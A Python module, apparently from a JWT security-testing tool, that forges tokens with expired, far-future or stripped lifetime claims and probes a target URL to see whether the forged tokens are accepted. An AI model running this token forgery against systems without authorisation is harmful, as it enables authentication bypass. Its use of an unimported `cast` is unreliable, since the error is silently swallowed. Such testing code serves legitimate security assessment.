"""Token lifetime and expiry manipulation attacks.

Tests for expired token acceptance, missing/expired claims manipulation,
and nbf/iat (not-before/issued-at) bypass via altered token lifetimes.
"""

import logging
import time
from typing import Any

from .attacks import JWT_AUTH_HEADERS, create_jwt, decode_jwt_part

logger = logging.getLogger(__name__)


class LifetimeManipulationAttack:
    """Tests token lifetime claim validation.

    Modifies exp, iat, nbf claims to test if the server
    properly validates token expiry and lifetime constraints.
    """

    def __init__(self, token: str):
        self.token = token
        self.attack_name = "lifetime_manipulation"

    def execute(self, url: str, session) -> dict[str, Any]:
        """Execute the lifetime manipulation attack."""
        result: dict[str, Any] = {"attack": self.attack_name, "vulnerable": False, "details": []}
        try:
            parts = self.token.split(".")
            if len(parts) != 3:
                return result
            header = decode_jwt_part(parts[0])
            payload = decode_jwt_part(parts[1])
            if not header or not payload:
                return result

            if not isinstance(header, dict):
                header = {"alg": "HS256", "typ": "JWT"}
            header["alg"] = "HS256"

            try:
                orig = session.get(url, timeout=8, verify=True)
                original_status = orig.status_code
            except Exception:
                original_status = 0

            lifetime_tests = [
                {
                    "name": "expired_token",
                    "payload": {
                        **dict(payload),
                        "exp": 1000000000,
                        "iat": 1000000000,
                        "nbf": 1000000000,
                    },
                },
                {
                    "name": "far_future_expiry",
                    "payload": {**dict(payload), "exp": 9999999999, "iat": int(time.time())},
                },
                {
                    "name": "missing_exp",
                    "payload": {
                        k: v for k, v in dict(payload).items() if k not in ("exp", "iat", "nbf")
                    },
                },
            ]

            for test in lifetime_tests:
                test_token = create_jwt(header, cast(dict[Any, Any], test["payload"]))

                for auth_header in JWT_AUTH_HEADERS:
                    resp = session.request(
                        "GET",
                        url,
                        headers={auth_header: f"Bearer {test_token}"},
                        timeout=10,
                        verify=True,
                    )
                    status = resp.status_code

                    if status in (200, 302) and original_status in (401, 403):
                        result["vulnerable"] = True
                        result["details"].append(
                            {
                                "test_name": test["name"],
                                "auth_header": auth_header,
                                "status_code": status,
                                "original_status": original_status,
                                "finding": f"lifetime_{test['name']}_bypass",
                            }
                        )
                        break

                    if status == 200 and test["name"] == "expired_token":
                        body = resp.text.lower()
                        if "error" not in body and "expired" not in body:
                            result["vulnerable"] = True
                            result["details"].append(
                                {
                                    "test_name": test["name"],
                                    "auth_header": auth_header,
                                    "status_code": status,
                                    "finding": f"lifetime_{test['name']}_accepted",
                                }
                            )
                            break

                if result["vulnerable"] and test["name"] == "expired_token":
                    break

            logger.info(
                "Lifetime manipulation test on %s: vulnerable=%s", url, result["vulnerable"]
            )
        except Exception as e:
            logger.error("Lifetime manipulation test error on %s: %s", url, e)
        return result
